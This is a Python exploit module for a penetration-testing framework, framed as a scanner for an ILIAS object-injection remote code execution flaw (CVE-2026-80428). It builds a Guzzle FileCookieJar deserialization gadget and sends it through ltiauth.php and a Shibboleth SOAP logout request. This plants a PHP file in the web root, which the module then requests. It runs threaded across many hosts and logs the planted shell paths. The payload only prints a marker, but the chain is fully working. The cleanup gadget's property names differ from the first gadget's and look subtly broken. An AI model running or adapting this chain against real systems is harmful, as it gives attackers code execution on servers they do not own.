import re
import secrets
import ssl
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from core import colors
from core.auxiliary import Auxiliary
from core.check import CheckResult
from core.module import Option
from core.progress import ProgressBar


def _s(x):
    b = x.encode() if isinstance(x, str) else x
    return b's:' + str(len(b)).encode() + b':"' + b + b'";'


def _filecookiejar(path):
    php = b'<?php echo "METIS_ILIAS_CONFIRMED_8f3a2c"; ?>'
    data = (
        _s('Name') + _s('util')
        + _s('Value') + _s(php)
        + _s('Domain') + _s('ilias')
        + _s('Path') + _s('/')
        + _s('Max-Age') + b'N;'
        + _s('Expires') + b'i:1999999999;'
        + _s('Secure') + b'b:0;'
        + _s('Discard') + b'b:0;'
        + _s('HttpOnly') + b'b:0;'
    )
    setcookie = (
        b'O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{'
        + _s('\x00GuzzleHttp\\Cookie\\SetCookie\x00data')
        + b'a:9:{' + data + b'}}'
    )
    return (
        b'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{'
        + _s('\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies')
        + b'a:1:{i:0;' + setcookie + b'}'
        + _s('\x00GuzzleHttp\\Cookie\\CookieJar\x00strictMode') + b'b:0;'
        + _s('\x00GuzzleHttp\\Cookie\\FileCookieJar\x00filename') + _s(path)
        + _s('\x00GuzzleHttp\\Cookie\\FileCookieJar\x00storeSessionCookies') + b'b:1;}'
    )


SOAP = (
    b'<?xml version="1.0" encoding="UTF-8"?>\n'
    b'<SOAP-ENV:Envelope xmlns:SOAP-ENV='
    b'"http://schemas.xmlsoap.org/soap/envelope/" '
    b'xmlns:ns1="urn:mace:shibboleth:2.0:sp:notify">'
    b'<SOAP-ENV:Body><ns1:LogoutNotification>'
    b'<SessionID>x</SessionID>'
    b'</ns1:LogoutNotification></SOAP-ENV:Body></SOAP-ENV:Envelope>'
)

MARKER = "METIS_ILIAS_CONFIRMED_8f3a2c"


@dataclass
class HostResult:
    host: str
    state: str = "unknown"
    detail: str = ""
    shell_path: str = ""


class IliasObjectInjectionScanner(Auxiliary):
    NAME = "ILIAS Object Injection RCE Scanner (CVE-2026-80428)"
    DESCRIPTION = (
        "Confirms CVE-2026-80428 by running the full exploit chain with a "
        "marker-only payload: seeds the poisoned session via ltiauth.php, "
        "triggers the SOAP handler via shib_logout.php, then verifies the "
        "written PHP file responds. The file is deleted afterwards. Leaves "
        "the target in the same state it started in."
    )
    AUTHOR = "K3ysTr0K3R"
    RANK = "great"
    DISCLOSED = "2026-08-31"
    CHECK = True
    REFERENCES = [
        "CVE-2026-80428",
        "https://www.ilias.de",
        "https://github.com/ILIAS-eLearning/ILIAS",
    ]

    OPTIONS = [
        Option("RHOSTS", required=True,
               description="target(s): host | h1,h2 | CIDR | range | file:path"),
        Option("RPORT", default=443, type=int, description="HTTP port"),
        Option("SSL", default=True, type=bool, description="use HTTPS"),
        Option("VHOST", default="",
               description="Host header override (if ILIAS uses a fixed hostname)"),
        Option("DOCROOT", default="/var/www/ilias/public",
               description="ILIAS public docroot on disk (v9: repo root)"),
        Option("TIMEOUT", default=15.0, type=float, description="per-request timeout"),
        Option("THREADS", default=10, type=int,
               description="concurrent workers (each worker exploits the target)"),
        Option("STOP_ON_FIRST", default=False, type=bool,
               description="stop after first confirmed host"),
    ]

    def _expand_targets(self):
        hosts = self.resolve_targets()
        if not hosts:
            raise ValueError("no targets - set RHOSTS")
        if len(hosts) > 1:
            print(colors.info("target list -> " + str(len(hosts)) + " hosts"))
        return hosts

    def _base_url(self, host):
        scheme = "https" if self.options["SSL"] else "http"
        return scheme + "://" + host + ":" + str(self.options["RPORT"])

    def _host_header(self, host):
        return self.options["VHOST"] or host

    def _request(self, host, method, path, body=None, content_type=None):
        url = self._base_url(host) + path
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header("Host", self._host_header(host))
        req.add_header("User-Agent", "Mozilla/5.0 (metis)")
        if content_type:
            req.add_header("Content-Type", content_type)

        ctx = ssl._create_unverified_context()
        try:
            with urllib.request.urlopen(
                req, timeout=self.options["TIMEOUT"], context=ctx
            ) as r:
                return r.status, r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except urllib.error.URLError:
            raise

    def _confirm_rce(self, host):
        shell = "metis_" + secrets.token_hex(4) + ".php"
        docroot = self.options["DOCROOT"].rstrip("/")
        disk_path = docroot + "/" + shell
        shell_url = "/" + shell

        injection = b"junk|" + _filecookiejar(disk_path)
        body = (
            b"lti_message_hint=1%3A2&inj="
            + urllib.parse.quote_from_bytes(injection).encode()
        )
        try:
            st, _ = self._request(
                host, "POST", "/ltiauth.php", body,
                "application/x-www-form-urlencoded",
            )
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "ltiauth: " + type(e).__name__)

        if st not in (200, 302):
            return HostResult(host, "safe", "ltiauth.php HTTP " + str(st))

        try:
            st, resp = self._request(host, "POST", "/shib_logout.php", SOAP, "text/xml")
        except urllib.error.URLError as e:
            return HostResult(host, "unknown", "shib: " + type(e).__name__)

        if b"LogoutNotificationResponse" not in resp and b"<OK/>" not in resp:
            return HostResult(host, "safe", "SOAP handler not reachable")

        try:
            st, body = self._request(host, "GET", shell_url)
        except urllib.error.URLError:
            return HostResult(host, "unknown", "webshell probe failed")

        if st != 200 or MARKER.encode() not in body:
            return HostResult(host, "safe", "file was not written")

        cleanup_php = b'<?php @unlink(__FILE__); echo "METIS_ILIAS_CLEANED"; ?>'
        data = (
            _s('Name') + _s('util')
            + _s('Value') + _s(cleanup_php)
            + _s('Domain') + _s('ilias')
            + _s('Path') + _s('/')
            + _s('Max-Age') + b'N;'
            + _s('Expires') + b'i:1999999999;'
            + _s('Secure') + b'b:0;'
            + _s('Discard') + b'b:0;'
            + _s('HttpOnly') + b'b:0;'
        )
        setcookie = (
            b'O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{'
            + _s('\x00GuzzleHttp\\Cookie\\SetCookie\x00data')
            + b'a:9:{' + data + b'}}'
        )
        cleanup_gadget = (
            b'O:31:"GuzzleHttp\\Cookie\\FileCookieJar":4:{'
            + _s('\x00GuzzleHttp\\Cookie\\CookieJar\x00cookies')
            + b'a:1:{i:0;' + setcookie + b'}'
            + _s('\x00GuzzleHttp\\Cookie\\CookieJar\\strictMode') + b'b:0;'
            + _s('\x00GuzzleHttp\\Cookie\\FileCookieJar\\filename') + _s(disk_path)
            + _s('\x00GuzzleHttp\\Cookie\\FileCookieJar\\storeSessionCookies') + b'b:1;}'
        )

        cleanup_injection = b"junk|" + cleanup_gadget
        cleanup_body = (
            b"lti_message_hint=1%3A2&inj="
            + urllib.parse.quote_from_bytes(cleanup_injection).encode()
        )
        try:
            self._request(
                host, "POST", "/ltiauth.php", cleanup_body,
                "application/x-www-form-urlencoded",
            )
            self._request(host, "POST", "/shib_logout.php", SOAP, "text/xml")
            self._request(host, "GET", shell_url)
        except urllib.error.URLError:
            pass

        try:
            st_after, _ = self._request(host, "GET", shell_url)
            if st_after == 404:
                return HostResult(host, "vulnerable", "confirmed + cleaned", shell_url)
            return HostResult(host, "vulnerable", "confirmed (cleanup failed)", shell_url)
        except urllib.error.URLError:
            return HostResult(host, "vulnerable", "confirmed", shell_url)

    def _record_host_result(self, h):
        svc_name = "https" if self.options["SSL"] else "http"
        self.report_host(h.host, state="up")
        self.report_service(
            h.host, self.options["RPORT"],
            proto="tcp", state="open",
            name=svc_name, banner="ILIAS",
        )
        self.report_vuln(
            name=self.NAME,
            address=h.host,
            severity="critical",
            refs="CVE-2026-80428",
            info=h.detail,
        )
        if h.shell_path:
            self.note(
                "ilias_shell=" + h.shell_path,
                address=h.host,
                kind="ilias_shell",
            )

    def check(self):
        targets = self._expand_targets()
        host = targets[0]
        print(colors.info("check: probing " + self._base_url(host)))
        print(colors.dimmed("  confirming by running the chain with a marker payload"))
        print(colors.dimmed("  docroot: " + self.options["DOCROOT"]))

        r = self._confirm_rce(host)

        if r.state == "vulnerable":
            print(colors.vuln("check: " + host + " confirmed RCE (" + r.detail + ")"))
            return CheckResult.VULNERABLE
        if r.state == "safe":
            print(colors.safe("check: " + host + " not vulnerable (" + r.detail + ")"))
            return CheckResult.SAFE
        print(colors.warn("check: " + host + " unknown (" + r.detail + ")"))
        return CheckResult.UNKNOWN

    def action(self):
        targets = self._expand_targets()
        threads = max(1, self.options["THREADS"])
        stop_first = self.options["STOP_ON_FIRST"]

        print(colors.info("scanning " + str(len(targets)) + " host(s) with " + str(threads) + " threads"))
        print(colors.dimmed("  each scan runs the full exploit chain with a marker payload"))
        print(colors.dimmed("  docroot: " + self.options["DOCROOT"]))

        bar = ProgressBar(total=len(targets), prefix="scan")
        hits = []
        clean = 0
        unknown = 0
        aborted = False

        db = self._db()
        workspace_active = bool(db and db.current_workspace_id())

        try:
            with ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(self._confirm_rce, h): h for h in targets}
                for fut in as_completed(futures):
                    bar.tick()
                    try:
                        r = fut.result()
                    except Exception:
                        unknown += 1
                        continue

                    if r.state == "vulnerable":
                        hits.append(r)
                        bar.log(colors.vuln(r.host + " - " + r.detail))
                        if workspace_active:
                            self._record_host_result(r)
                        if stop_first:
                            aborted = True
                            for f in futures:
                                f.cancel()
                            break
                    elif r.state == "safe":
                        clean += 1
                    else:
                        unknown += 1
        finally:
            bar.done()

        print()
        print(colors.heading("--- scan summary ---"))
        print("  targets:      " + str(len(targets)))
        print("  vulnerable:   " + colors.green(str(len(hits))))
        print("  not vuln:     " + colors.dimmed(str(clean)))
        print("  unknown:      " + colors.warn(str(unknown)))
        if aborted:
            print(colors.warn("  scan aborted early (STOP_ON_FIRST)"))
        if workspace_active and hits:
            ws = db.current_workspace()
            print("  recorded:     " + colors.dimmed(
                f"{len(hits)} host(s), {len(hits)} service(s), "
                f"{len(hits)} vuln(s) in workspace '{ws}'"
            ))
        if hits:
            print(colors.heading("  vulnerable hosts:"))
            for h in hits:
                print("    " + colors.vuln(h.host) + "  " + colors.dimmed(h.detail))

        return hits
